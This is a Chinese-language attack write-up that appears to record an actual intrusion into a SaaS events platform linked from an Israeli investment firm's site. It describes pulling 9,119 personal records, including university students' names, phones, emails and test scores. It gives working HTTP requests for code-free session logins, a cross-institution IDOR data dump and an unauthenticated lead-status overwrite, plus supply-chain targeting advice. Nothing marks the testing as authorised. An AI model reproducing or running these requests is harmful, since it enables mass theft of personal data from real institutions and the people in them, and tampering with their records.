# AS-Invest — 供应链 SaaS (iCreate) 跨机构 IDOR 拖 9119 条 PII

> 目标：as-invest.co.il（以色列资管巨头，千亿谢克尔级资产）
> 突破口：iCreate SaaS 营销平台（join.as-invest → camp.mini-sites.net）
> 泄露：9119 条 PII（约 7090 真实），跨 6 个机构

## 供应链攻击入口

主目标 www.as-invest.co.il 有 F5 ASM WAF + IP 白名单，正面硬打无望。
但 `join.as-invest.co.il` → 301 → `camp.mini-sites.net`（iCreate SaaS）→ **无 WAF**。

```
主目标: www.as-invest.co.il (F5 WAF + IP 白名单)
    ↓ 供应链跳转
join.as-invest.co.il → camp.mini-sites.net (iCreate SaaS, 无 WAF)
    ↓ JS 逆向
openday.js → 55 个 API 端点 + 硬编码 brand_access_token
    ↓ 无码认证
POST /auth/scanner-entry (requires_code=false) → scanner session_token
    ↓ 跨机构 IDOR
GET /entities/Registrant/list?limit=100000 → 9119 条全平台 PII
```

**核心洞察**：攻击主目标时，先找其 SaaS 供应链（营销/CRM/HR/支付），SaaS 平台通常防护远弱于主站。

## IDOR 根因

`/entities/Registrant/list` 端点**不按 token 的 `institution_id` 过滤** → 用任意机构的 scanner token 可拖全平台数据。

```http
GET /entities/Registrant/list?limit=100000
Authorization: Bearer <scanner_session_token_from_any_institution>

→ 返回跨所有 institution 的 Registrant 数据
```

## 泄露数据明细

| 机构 | 条数 | 性质 |
|------|------|------|
| 以色列理工学院 Technion | 4777 | 真实学生（院系+姓名+手机+邮箱，含 campus.technion.ac.il）|
| 3c081f45 | 1634 | 真实（姓名+手机+邮箱）|
| 特拉维夫大学 TAU | 688 | 真实（含高考/心理测量/适配分数）|
| 61d4c614 | 2004 | 测试 (LoadTest/example.com) |
| d1000001 / 72a66815 | 16 | 测试 |

- 9119 条全部含 `full_name + phone`，8352 条含 email
- QueueEntry 769 条，**505 条含敏感学业分数**（高考平均分/心理测量/适配分数）
- 越权写：`scanner/check-in` 可篡改学生签到状态

## 认证绕过细节

### scanner-entry 无码登录
```http
POST /auth/scanner-entry
Content-Type: application/json

{
  "institution_id": "0dc53a32",   ← 特拉维夫大学
  "event_id": "xxx"               ← requires_code=false 的 event
}
→ 200 OK, session_token (role=scanner)
```

### advisor-entry 空 body 登录
```http
POST /auth/advisor-entry
Content-Type: application/json
{}
→ 200 OK, session_token (role=advisor)
```

机构 3c081f45 的 event 配置 `requires_code=false + requires_user=false` → 空 body 直接拿 advisor token。

## CRM.UpdateLeadStatus 未认证 UPSERT

```http
POST /Api/V1/CRM/UpdateLeadStatus?Id=999999999&brandId=xxx&statusId=1
→ {"scan_status":"ok","arrived_at":"2026-09-14T..."} ← 完全无认证！
```

任意 Id（含负数）+ 任意 brandId → 可创建/篡改任意 lead 的状态。UPSERT 模式意味着不存在的 ID 也会被创建。

## 通用教训

1. **SaaS 供应链是主目标的软肋** — 主站防护再强，供应链 SaaS 通常无 WAF、无 IP 限制
2. **多租户 IDOR 检查 institution_id** — SaaS 平台的 list 端点必须按 token 所属机构过滤
3. **JS 逆向是 SaaS 突破的钥匙** — SPA 的 JS bundle 暴露全部 API 端点和硬编码 token
4. **requires_code=false 是功能设计漏洞** — 任何"无码"选项都是认证绕过的入口
